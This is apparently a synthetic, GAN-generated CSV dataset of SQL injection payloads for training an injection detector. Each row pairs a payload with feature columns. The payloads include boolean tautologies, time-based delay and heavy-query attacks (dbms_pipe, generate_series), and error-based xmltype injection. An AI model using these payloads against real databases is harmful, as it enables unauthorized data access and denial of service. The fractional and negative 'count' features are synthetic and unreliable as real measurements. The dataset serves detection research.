id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,boolean,"1%' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R005187,9.361087381128522,149.3955841064453,44.83626174926758,34.89225769042969,-6.760429382324219,-7.261771202087402,58.04341506958008,19.0374698638916,0.998466432094574,0.15398778021335602,-0.04862809553742409,0.5598953366279602,0.17762130498886108,4.47397518157959,2.834674596786499,2.1143271923065186,-0.8554978966712952,0.319551557302475,-0.22110909223556519,-0.14757364988327026,6.273420810699463,5.145216941833496,2.7401769161224365,-0.05486632138490677,1.63017737865448,-0.2689485251903534,0.030933966860175133,2.569634437561035,0.29870861768722534,0.6738601922988892,-0.026991883292794228,-0.0593595877289772,1.8125245571136475,-0.0944184884428978,-0.08614643663167953,1.2665491104125977,4.322857856750488,1.1619627475738525,0.6495810151100159,-0.4038428068161011,0.36336496472358704,0.8163716793060303,-0.15134748816490173,0.47652316093444824,0.1692943572998047,0.004096520598977804,0.0645214393734932,0.4500834345817566,0.21503394842147827,0.05552801862359047,0.04377896711230278,0.5620445013046265,1.0407260656356812,0.1715148538351059,-0.09383033215999603,-0.0374758318066597,0.21426783502101898,0.4545714855194092,0.07554122805595398,-0.5362004041671753,0.004587543196976185,-0.07065345346927643,0.0025614385958760977,3.924835681915283,0.014536055736243725,0.07493797689676285,0.29306551814079285,0.43220585584640503,-0.38350173830986023,-0.0032581528648734093,-0.007557365577667952,-0.015760891139507294,-0.005523843225091696,-0.053461477160453796,-0.008141930215060711,-0.11192066967487335,1.9720696210861206,-0.04569900408387184,-0.004807150457054377,-0.06939810514450073,0.3590956926345825,9.553088188171387,-0.10082654654979706,0.3402682840824127,0.49240419268608093,0.3138831853866577,-0.0040595815517008305,0.7349152565002441,-0.007622295059263706
GAN_000012,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000273,4.214867691990771,38.010475158691406,24.0158634185791,8.894227981567383,-5.956829071044922,-3.6717047691345215,12.51871109008789,-1.3853435516357422,0.9989116191864014,0.3466324210166931,0.10310409963130951,0.4219523072242737,0.14157460629940033,3.4078574180603027,2.495594024658203,0.9465673565864563,1.4393980503082275,0.14044372737407684,0.04660316929221153,-0.020028309896588326,1.141554832458496,2.4866151809692383,1.040844202041626,-0.0012885453179478645,1.0506291389465332,-0.025328878313302994,0.02910413034260273,0.13371974229812622,-0.018929772078990936,0.34981098771095276,-0.08418826758861542,0.06727848201990128,-0.2743750512599945,0.04483892023563385,0.45696336030960083,0.7661011815071106,-1.042778730392456,1.5772937536239624,0.4105638563632965,-0.028504550457000732,0.03734215348958969,0.09039122611284256,0.12229761481285095,0.061890002340078354,0.07022076100111008,-0.047182537615299225,-0.014559181407094002,0.17988891899585724,0.04422464594244957,-0.07774002850055695,-0.21440526843070984,0.12583370506763458,0.3374488651752472,0.02931748703122139,-0.0685674250125885,-0.006100140977650881,0.034904949367046356,0.03988233953714371,0.00849038828164339,-0.44141945242881775,0.005301549099385738,-0.2543679177761078,-0.002787022851407528,1.086606502532959,0.07836974412202835,-0.005739158485084772,-0.07436376810073853,-0.06789738684892654,-0.6316048502922058,0.0008812416926957667,0.016797620803117752,0.0037087202072143555,-0.0010231855558231473,-0.025427116081118584,-0.012762700207531452,-0.017772426828742027,0.0659143328666687,1.2104027271270752,0.0026668738573789597,0.043797530233860016,0.048082176595926285,1.825987458229065,1.084550380706787,-0.06309659034013748,0.2206641137599945,-0.0006939396262168884,0.03682754933834076,-0.2951032519340515,-0.010268081910908222
GAN_000013,attack,other,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  ||'",nearest_attack_euclidean,R000813,5.842234090719342,115.7567138671875,53.3006591796875,1.631747841835022,81.57698059082031,1.700624942779541,49.62315368652344,40.13208770751953,1.0006511211395264,0.40225356817245483,0.05262717232108116,0.29217684268951416,0.22970768809318542,3.9261703491210938,1.9597638845443726,-0.4737722873687744,0.28450286388397217,-0.36683276295661926,0.3427809178829193,0.06583170592784882,7.919393539428711,6.0520339012146,2.550963878631592,0.03174270689487457,0.23574718832969666,0.011699297465384007,-0.003935681190341711,-0.39212408661842346,-0.8134486675262451,0.15707556903362274,0.08674610406160355,-0.035070616751909256,0.24326641857624054,-0.18996018171310425,-0.3166172206401825,0.1544310599565506,6.811211109161377,0.6226859092712402,1.7956202030181885,0.044676706194877625,-0.04162243753671646,0.5863872766494751,0.42727380990982056,-0.18999916315078735,-0.048521652817726135,0.04780192673206329,-0.021872717887163162,-0.09132131189107895,0.009328225627541542,0.2474219799041748,0.3453942537307739,0.05744070187211037,0.08800138533115387,-0.06720849126577377,-0.07542746514081955,0.021613910794258118,0.08531452715396881,0.260994553565979,0.01967901922762394,0.011271301656961441,-0.005354577675461769,0.07543812692165375,0.0072776242159307,0.91478431224823,-0.18803879618644714,-0.14516445994377136,0.05625291168689728,-0.1329604983329773,0.2150316834449768,-0.0039005146827548742,-0.06580367684364319,-0.0035921132657676935,0.007360223680734634,0.03868228569626808,0.005365947727113962,0.03830496221780777,0.27285176515579224,-0.4939279556274414,-0.02171657606959343,0.598300039768219,-0.07768955826759338,1.8595904111862183,-0.08220426738262177,-0.01184763852506876,0.15863585472106934,0.017583690583705902,0.021926628425717354,-0.31137990951538086,0.033800095319747925
GAN_000014,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R003369,2.841545576429924,89.32781982421875,31.797677993774414,20.714799880981445,38.64655303955078,0.006340204272419214,18.434404373168945,7.635367393493652,0.999442458152771,0.32520851492881775,0.20639893412590027,0.3731033504009247,0.12544260919094086,3.464242458343506,0.41654351353645325,1.705121636390686,1.4728673696517944,0.16663628816604614,0.0840558260679245,-0.009083263576030731,2.105984926223755,4.21242618560791,1.102532148361206,0.005299683660268784,2.1241352558135986,0.019557934254407883,-0.017430974170565605,0.007120444905012846,-0.059825919568538666,-0.20513524115085602,-0.09075655043125153,0.06033061444759369,-0.08643997460603714,0.04336577653884888,0.7213454246520996,1.9062535762786865,-0.5714017748832703,0.6852827072143555,0.3285277783870697,-0.06432946026325226,0.8012086749076843,-0.04165443032979965,0.00744242500513792,-0.004575444385409355,0.04499431326985359,-0.03439227491617203,0.0011093703797087073,-0.00538895046338439,-0.05485667660832405,-0.1145341545343399,-0.1428733766078949,0.029316244646906853,0.23667004704475403,-0.02328532002866268,-0.02159910835325718,0.001582827651873231,-0.017433755099773407,0.015652745962142944,-0.018876854330301285,-0.07244541496038437,0.0026569270994514227,-0.1424940824508667,0.00672792037948966,0.2517051696777344,0.006244897376745939,-0.0281135905534029,0.0035829360131174326,0.009544064290821552,-0.1772364377975464,0.0003064174670726061,0.028973979875445366,0.0023553993087261915,0.0007903131190687418,-0.01520549040287733,-0.007111197803169489,0.012291841208934784,0.6292017102241516,0.5660877823829651,0.0038815978914499283,0.05453808605670929,-0.0017865069676190615,0.6319980025291443,1.2759428024291992,-0.05359090119600296,0.07231772691011429,-0.005932800471782684,0.014077245257794857,-0.2525857090950012,0.0012553815031424165
GAN_000015,attack,boolean,"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003883,5.937096590623073,125.9640121459961,28.81090545654297,23.612829208374023,37.07351303100586,-0.25057902932167053,45.417659759521484,13.49254035949707,0.9999694228172302,0.2931312322616577,0.26287493109703064,0.26438766717910767,0.07518147677183151,3.0306344032287598,-1.4190431833267212,-0.5585720539093018,1.5294722318649292,0.4121812880039215,-0.06121249124407768,0.08256692439317703,2.6864306926727295,0.6453747749328613,3.2105658054351807,-0.009200257249176502,0.6103115677833557,0.16027019917964935,0.05649619549512863,1.296488642692566,-0.4785495698451996,1.4006785154342651,0.06078656017780304,0.15215550363063812,-0.4055860936641693,0.25279828906059265,1.4161738157272339,0.5530282855033875,1.7863795757293701,0.03297324851155281,1.619550108909607,0.028062298893928528,0.5082411170005798,1.5789238214492798,-0.14019007980823517,0.09726226329803467,0.09606129676103592,0.054064344614744186,0.020822767168283463,0.2295951247215271,-0.38712260127067566,-0.09766355156898499,-0.30616897344589233,-0.18858526647090912,-0.09516064822673798,-0.0863809734582901,0.18378114700317383,0.010040288791060448,0.08367075771093369,0.0746549591422081,-0.016043996438384056,0.2314307987689972,0.004709441214799881,-0.06765562295913696,-0.008740885183215141,-1.7437182664871216,-0.0004124955739825964,-0.021912429481744766,0.20110858976840973,-0.16764117777347565,0.0906834602355957,-0.002535372506827116,0.031190522015094757,0.008225508965551853,0.003628847189247608,-0.017513738945126534,0.020586060360074043,0.14149044454097748,-0.31726256012916565,1.0550930500030518,0.005980377551168203,-0.3513198792934418,0.049821048974990845,4.050930976867676,0.7773454189300537,-0.11871732026338577,-0.08546359837055206,0.044383689761161804,0.010232712142169476,-0.41326189041137695,0.022746505215764046
GAN_000016,attack,boolean,1' and   (  3020  =  3020  )  *6703 and 'tmng' like 'tmng,nearest_attack_euclidean,R001754,7.121529050772217,42.38807678222656,23.580638885498047,10.357017517089844,-29.38677978515625,1.9107859134674072,22.294361114501953,16.450836181640625,0.9998434782028198,0.20066991448402405,0.0668746754527092,0.21163789927959442,0.2534378468990326,3.800551176071167,2.976525068283081,0.4478404223918915,-0.010993251577019691,-0.0841761976480484,0.2759600579738617,-0.021457720547914505,2.680051803588867,1.3371169567108154,1.5998960733413696,0.026542723178863525,0.7371716499328613,-0.2113662213087082,0.017443150281906128,-0.435071736574173,-0.5926678776741028,0.6995717883110046,-0.018130382522940636,-0.09129510819911957,1.1904302835464478,-0.2623804211616516,-0.13233406841754913,0.5342659950256348,4.841461181640625,1.2973549365997314,1.3979339599609375,-0.2662898004055023,-0.07907027751207352,-0.10599838942289352,0.1922861486673355,0.022156929597258568,0.04889638349413872,0.049216002225875854,0.02478841505944729,-0.26180246472358704,-0.0979248508810997,0.16617581248283386,-0.05334974452853203,0.23722903430461884,0.9225141406059265,0.13300465047359467,-0.18778659403324127,-0.016453884541988373,0.11340905725955963,0.08657314628362656,0.04828822612762451,-0.31745076179504395,-0.0025269503239542246,0.17248792946338654,0.0033752911258488894,2.2528817653656006,-0.1005963385105133,-0.05385953187942505,0.3225914537906647,0.02765512838959694,0.02545507811009884,-0.008144761435687542,-0.12114792317152023,-0.01969464309513569,0.005650036036968231,0.0492224246263504,0.00826811883598566,-0.15436194837093353,1.3568278551101685,0.006623235996812582,-0.008588561788201332,0.6395169496536255,0.21736836433410645,4.072867393493652,0.12296389043331146,0.239863783121109,0.2802198529243469,0.12859484553337097,0.023648498579859734,0.40396755933761597,0.021166691556572914
GAN_000017,attack,boolean,"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R006679,3.891479779178847,153.3418731689453,45.04356384277344,18.838136672973633,82.68299865722656,1.0802472829818726,42.53969955444336,29.30331039428711,0.9996597170829773,0.3384533226490021,0.13967403769493103,0.35028576850891113,0.19954773783683777,3.5162770748138428,3.674435615539551,1.3782397508621216,0.7574803233146667,-0.19767563045024872,0.1718255579471588,0.008784212172031403,5.490298271179199,6.350626468658447,2.5111751556396484,0.03825470060110092,2.4894745349884033,0.05486997216939926,-0.015476650558412075,-0.08633707463741302,0.6476746797561646,-0.44981420040130615,-0.007130307611078024,0.054353199899196625,-0.03225717321038246,-0.03872767090797424,0.43398839235305786,2.147416591644287,1.9732767343521118,2.200486660003662,1.270353078842163,0.042418450117111206,1.1070159673690796,-0.05032625049352646,0.14551936089992523,-0.0660472884774208,-0.013675571419298649,0.009063716046512127,0.03534910827875137,-0.10265900939702988,-0.06765484064817429,-0.05792983993887901,0.09994649887084961,-0.22989784181118011,0.335172563791275,-0.026361925527453423,0.003927411511540413,0.01130171213299036,-0.030044082552194595,0.056634996086359024,0.004626933950930834,0.12544377148151398,0.0035737717989832163,0.004184167832136154,0.014667467214167118,1.2371244430541992,-0.09803228825330734,-0.05237945169210434,-0.042542170733213425,-0.06161760166287422,0.19143842160701752,0.003065176075324416,0.01523863896727562,-0.0016665185103192925,0.0057577951811254025,0.004802779760211706,-0.010791292414069176,-0.000913043855689466,0.5599281787872314,0.17468030750751495,0.0004229773476254195,0.33154672384262085,-0.0325297974050045,3.999098539352417,0.8510608673095703,0.008203989826142788,0.118852898478508,-0.02312430739402771,0.0563412681221962,-0.3958502411842346,0.0212158914655447
GAN_000018,attack,boolean,1' in boolean mode  )   and   (  8610  =  2985  )  *2985#,nearest_attack_euclidean,R005566,6.8180464235887515,43.202301025390625,23.15553092956543,3.7901179790496826,-62.82954406738281,-5.849136829376221,20.20928382873535,-13.549482345581055,0.9979499578475952,0.36462998390197754,0.038601454347372055,0.4532108008861542,0.08724832534790039,4.067166805267334,3.921879291534424,-0.16598856449127197,0.18283604085445404,0.8104026913642883,-0.10104011744260788,-0.049928657710552216,1.5645771026611328,0.357684850692749,0.7461341023445129,-0.039585180580616,0.903680682182312,-0.08674611151218414,0.05539701506495476,0.771479070186615,0.43165701627731323,0.7873543500900269,-0.12510202825069427,0.06679165363311768,-0.3485246002674103,0.324806809425354,1.01019287109375,0.16610188782215118,-1.4788281917572021,1.345658779144287,0.39482834935188293,-0.12199373543262482,0.1727529764175415,0.7039059400558472,0.01729796826839447,0.23315352201461792,0.13767404854297638,-0.03579673543572426,-0.008587328717112541,0.43335920572280884,0.16844028234481812,-0.172903910279274,-0.23287919163703918,0.32877448201179504,0.5699203014373779,0.10093819350004196,-0.008342726156115532,-0.018345259130001068,0.08072885125875473,0.10260191559791565,0.022526802495121956,-0.49386870861053467,0.012752166949212551,-0.3896622955799103,-0.01050525438040495,1.9673813581466675,0.18443642556667328,0.07628785073757172,-0.06808589398860931,-0.12689025700092316,-0.8199179172515869,0.0033826983999460936,0.029792943969368935,0.002579782158136368,-0.00573989050462842,-0.06607437878847122,-0.003334864042699337,0.00411899434402585,0.7800019979476929,0.5332280993461609,0.003512566676363349,-0.07095350325107574,0.17262710630893707,4.395444869995117,0.5280874371528625,0.0292220339179039,0.24836261570453644,-0.008720077574253082,0.01152498833835125,0.06336291879415512,-0.014498433098196983
GAN_000019,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,3.6019998427597817,53.543373107910156,31.454448699951172,7.996987819671631,35.250709533691406,-0.28450605273246765,24.742570877075195,10.6959810256958,0.9994803667068481,0.38042691349983215,0.06978724151849747,0.4033237397670746,0.07694513350725174,3.2981128692626953,-0.08088909089565277,0.4529264569282532,0.6207531690597534,0.8984166383743286,0.07262380421161652,0.038072410970926285,1.8919200897216797,3.3523054122924805,0.6522186398506165,0.009410064667463303,0.7949977517127991,0.0875617116689682,0.03382323682308197,0.4374014437198639,-0.7169166207313538,0.757880687713623,-0.0341205969452858,0.06834921985864639,-0.3275977075099945,0.0831141546368599,1.1524816751480103,0.49699729681015015,2.698796272277832,0.4869644343852997,0.6619144082069397,0.035206764936447144,0.2847457230091095,0.8408325910568237,0.3228629529476166,0.015694962814450264,0.08183211833238602,0.021628685295581818,-0.014942759647965431,0.12348023802042007,-0.13946197926998138,0.0631498172879219,-0.09552838653326035,-0.09193998575210571,-0.0513126514852047,-0.04767939820885658,0.06657075136899948,0.024252809584140778,0.03951790928840637,-0.0314175970852375,-0.008244005031883717,-0.11487925797700882,0.001838542753830552,-0.15875856578350067,-0.008821767754852772,-0.7308392524719238,0.019035886973142624,-0.034488290548324585,0.0022840017918497324,-0.1469123512506485,-0.2290189564228058,0.003785897744819522,0.003702511778101325,0.0067824977450072765,0.001323218923062086,0.014166026376187801,0.007135206367820501,0.057591650635004044,-0.18456688523292542,1.2465250492095947,-0.0034241890534758568,0.03397055342793465,0.009339441545307636,1.4908372163772583,0.7401379942893982,-0.08082444220781326,0.34080445766448975,-0.044946327805519104,-0.008038802072405815,-0.09540265798568726,-0.0005840555531904101
GAN_000020,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R007588,4.058336269843937,136.9720001220703,43.0875358581543,29.69239044189453,46.42744445800781,-3.0444045066833496,37.98341369628906,11.674710273742676,0.9991813898086548,0.4031520485877991,0.17998605966567993,0.3913152813911438,0.08192280679941177,3.794682264328003,0.9690450429916382,0.7584608197212219,2.1433417797088623,0.06275246292352676,-0.02184862270951271,-0.01960582658648491,5.665011405944824,6.072921276092529,2.0356805324554443,-0.008105608634650707,2.4077155590057373,0.020571401342749596,-0.036330655217170715,0.3666731119155884,0.821534276008606,0.22000662982463837,-0.02236342616379261,0.08875706046819687,-0.15060415863990784,-0.03729992359876633,0.8874530792236328,1.968986988067627,1.1921899318695068,0.6279053688049316,0.5165802836418152,-0.0072734360583126545,0.7625349164009094,0.15116344392299652,-0.05428825691342354,0.059129491448402405,0.002354311291128397,-0.06449249386787415,-0.004813340958207846,0.14193016290664673,0.04222479090094566,-0.20621119439601898,-0.1282268762588501,0.06343191862106323,0.4591783881187439,-0.006455544847995043,-0.011982841417193413,-0.0031093345023691654,0.00027382097323425114,0.09729442745447159,0.005938874091953039,-0.09094120562076569,0.007030453532934189,-0.18690043687820435,0.003250979818403721,1.3554649353027344,0.08152740448713303,0.018507005646824837,-0.03508780524134636,-0.0005153072997927666,-0.1426415592432022,0.0007346594356931746,0.06135568395256996,-0.0017328000394627452,-0.0033796292264014482,-0.07021422684192657,-0.01630462147295475,0.010446975007653236,0.8981894850730896,0.5954165458679199,0.0060805948451161385,-0.11566643416881561,0.019562963396310806,3.444366931915283,1.1933785676956177,-0.03287450224161148,0.12369223684072495,-0.05991773307323456,0.027449876070022583,-0.2697238028049469,-0.012443438172340393
GAN_000021,attack,other,1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',nearest_attack_euclidean,R004253,13.21837432996306,250.6841278076172,74.3310317993164,47.74378967285156,9.475879669189453,-2.9756414890289307,20.442228317260742,29.994321823120117,0.997804582118988,0.3374347686767578,0.07975205779075623,0.5987451672554016,0.18926170468330383,4.084184646606445,4.324587821960449,-3.7964468002319336,1.315457820892334,0.37345439195632935,0.08590216934680939,-0.136624276638031,10.994421005249023,5.802578449249268,-1.2846789360046387,-0.10803952068090439,2.643084764480591,-0.29437169432640076,0.03299522027373314,-0.5418685078620911,3.150907278060913,0.12049662321805954,0.11064785718917847,-0.03218643367290497,1.0072977542877197,-0.001451263204216957,-0.45285001397132874,2.513047695159912,9.237360954284668,-0.6380869746208191,2.4769110679626465,-0.48557597398757935,0.6554867625236511,0.7873512506484985,0.258186012506485,-0.009804239496588707,-0.2657351493835449,-0.022906050086021423,-0.05254938825964928,1.5945149660110474,1.8670297861099243,1.7979212999343872,1.642046570777893,3.251246690750122,0.2780883014202118,0.23165357112884521,-0.15364007651805878,-0.12016983330249786,0.1466362625360489,-0.22932396829128265,0.12642627954483032,0.23721575736999512,0.00821930356323719,0.7198361158370972,-0.008451566100120544,3.7988576889038086,0.34406745433807373,0.14636445045471191,0.013418171554803848,0.16345064342021942,0.554446280002594,-0.005727914161980152,-0.020248880609869957,-0.025148209184408188,-0.004507453180849552,0.14407198131084442,0.0012373542413115501,0.028169384226202965,-0.06073674187064171,-0.3408682942390442,0.03681771457195282,-0.29089590907096863,0.07643099129199982,19.78656768798828,0.017789795994758606,0.5338348746299744,0.3443719744682312,0.3685917854309082,0.0023506847210228443,0.6396080851554871,0.045166872441768646
GAN_000022,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,3.961602392410426,129.2609100341797,47.3711051940918,17.728015899658203,42.28129959106445,-5.0697126388549805,30.563020706176758,14.112712860107422,0.9995072484016418,0.37644636631011963,0.10069170594215393,0.4672775864601135,0.10124324262142181,3.416140556335449,2.6738638877868652,-1.4104397296905518,1.365691900253296,0.18897809088230133,-0.038761433213949203,-0.028665922582149506,7.560774803161621,6.083924293518066,2.0866811275482178,-0.01508962269872427,1.366937518119812,-0.04048856347799301,-0.04039336368441582,0.19238519668579102,0.8304587006568909,0.09648843854665756,0.03221214935183525,0.031049475073814392,-0.32923391461372375,-0.05214132368564606,0.4509679675102234,0.8953289985656738,3.7848241329193115,0.43046489357948303,0.21295969188213348,-0.07412122189998627,-0.09553668648004532,0.154911071062088,-0.04265532270073891,0.04195646941661835,-0.009547037072479725,-0.035941265523433685,-0.010608717799186707,0.24978788197040558,0.21473249793052673,0.009245233610272408,0.062286537140607834,0.36976873874664307,0.36570504307746887,0.01116244774311781,-0.03816370666027069,-0.025068609043955803,0.045517053455114365,0.1727597415447235,0.03006282076239586,0.1180787906050682,0.00750195886939764,-0.020366493612527847,-0.001683633541688323,1.902261734008789,0.06778376549482346,0.007616149727255106,-0.10943862795829773,0.008022339083254337,-0.21639366447925568,0.0034612412564456463,0.029526688158512115,-0.004508312325924635,-0.004656671546399593,-0.032938867807388306,-0.008938528597354889,-0.0014126667520031333,0.6853501796722412,0.32371896505355835,0.006865738425403833,0.03285204619169235,0.0032165951561182737,4.214745044708252,0.7510164976119995,0.04544549435377121,0.032968148589134216,-0.038338348269462585,0.018329082056879997,-0.18575824797153473,-0.010541918687522411
GAN_000023,attack,error,1   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5139  =  5139,nearest_attack_euclidean,R002038,15.379247280668597,391.3400573730469,152.0378875732422,91.01776123046875,194.71066284179688,2.2284209728240967,46.48928451538086,88.66963958740234,1.0005288124084473,0.2353702336549759,0.2200537919998169,0.587059736251831,0.12566524744033813,4.021290302276611,-5.361203193664551,4.4954915046691895,0.4806649684906006,0.6456119418144226,0.3607451319694519,-0.24354858696460724,22.40776252746582,19.777467727661133,2.114105701446533,-0.09546884149312973,3.585249662399292,-0.22208891808986664,-0.12113881856203079,0.7674062252044678,2.4769351482391357,-1.0183300971984863,0.09578652679920197,-0.06704134494066238,2.2756567001342773,-0.21364523470401764,-1.3299243450164795,3.579547166824341,19.558963775634766,-2.046090841293335,2.470053195953369,-0.7345989346504211,0.21294495463371277,1.41521418094635,0.31042909622192383,-0.04701260104775429,-0.3482169508934021,-0.016170525923371315,-0.09149333089590073,1.703202486038208,2.3302643299102783,2.2146525382995605,2.3865113258361816,2.972562313079834,-0.17452068626880646,0.07770472764968872,-0.029267525300383568,-0.08871492743492126,0.11175297945737839,-0.04990227892994881,0.048364121466875076,0.859413743019104,0.007650455925613642,0.22951996326446533,0.0251429695636034,3.511451482772827,0.10904006659984589,0.08152028173208237,0.5954476594924927,-0.19656763970851898,0.9887209534645081,-0.008371727541089058,0.019925305619835854,-0.027874931693077087,0.00968437734991312,0.19668802618980408,0.027053210884332657,-0.21813663840293884,2.018160581588745,-0.7840992212295532,0.010181494057178497,0.022802693769335747,-0.09757096320390701,18.5129451751709,-0.2188393920660019,0.4581276476383209,0.5330032110214233,0.5756229162216187,-0.004738286603242159,1.0792819261550903,0.07879596203565598
